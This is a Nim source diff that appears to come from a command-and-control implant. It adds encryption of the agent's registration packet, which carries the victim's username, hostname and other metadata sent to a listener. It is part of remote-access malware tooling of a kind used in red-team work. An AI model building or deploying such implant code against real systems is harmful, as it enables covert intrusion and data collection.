@@ -1,6 +1,6 @@
-import winim, os, net, strformat, strutils, registry
+import winim, os, net, strformat, strutils, registry, sugar
 
-import ../../../common/[types, serialize, utils]
+import ../../../common/[types, serialize, crypto, utils]
 
 # Hostname/Computername
 proc getHostname*(): string = 
@@ -200,12 +200,14 @@ proc collectAgentMetadata*(config: AgentConfig): AgentRegistrationData =
             version: VERSION, 
             packetType: cast[uint8](MSG_REGISTER),
             flags: cast[uint16](FLAG_PLAINTEXT),
-            seqNr: 1'u32, # TODO: Implement sequence tracking
             size: 0'u32,
-            hmac: default(array[16, byte])
-        ), 
-        metadata: AgentMetadata(
             agentId: uuidToUint32(config.agentId),
+            seqNr: 1'u64, # TODO: Implement sequence tracking
+            iv: generateIV(),
+            gmac: default(AuthenticationTag)
+        ), 
+        sessionKey: config.sessionKey,
+        metadata: AgentMetadata(
             listenerId: uuidToUint32(config.listenerId),
             username: getUsername().toBytes(),
             hostname: getHostname().toBytes(),
@@ -219,13 +221,12 @@ proc collectAgentMetadata*(config: AgentConfig): AgentRegistrationData =
         )
     )
 
-proc serializeRegistrationData*(data: AgentRegistrationData): seq[byte] = 
+proc serializeRegistrationData*(config: AgentConfig, data: var AgentRegistrationData): seq[byte] = 
 
     var packer = initPacker()
 
     # Serialize registration data
     packer 
-        .add(data.metadata.agentId)
         .add(data.metadata.listenerId)
         .addVarLengthMetadata(data.metadata.username)
         .addVarLengthMetadata(data.metadata.hostname)
@@ -240,9 +241,18 @@ proc serializeRegistrationData*(data: AgentRegistrationData): seq[byte] =
     let metadata = packer.pack()
     packer.reset()
 
-    # TODO: Encrypt metadata
+    # Encrypt metadata
+    let (encData, gmac) = encrypt(config.sessionKey, data.header.iv, metadata, data.header.seqNr)
+
+    # Set authentication tag (GMAC)
+    data.header.gmac = gmac
 
     # Serialize header
-    let header = packer.packHeader(data.header, uint32(metadata.len))
+    let header = packer.packHeader(data.header, uint32(encData.len))
+    packer.reset()
 
-    return header & metadata
+    # Serialize session key
+    packer.addData(data.sessionKey)
+    let key = packer.pack()
+
+    return header & key & encData
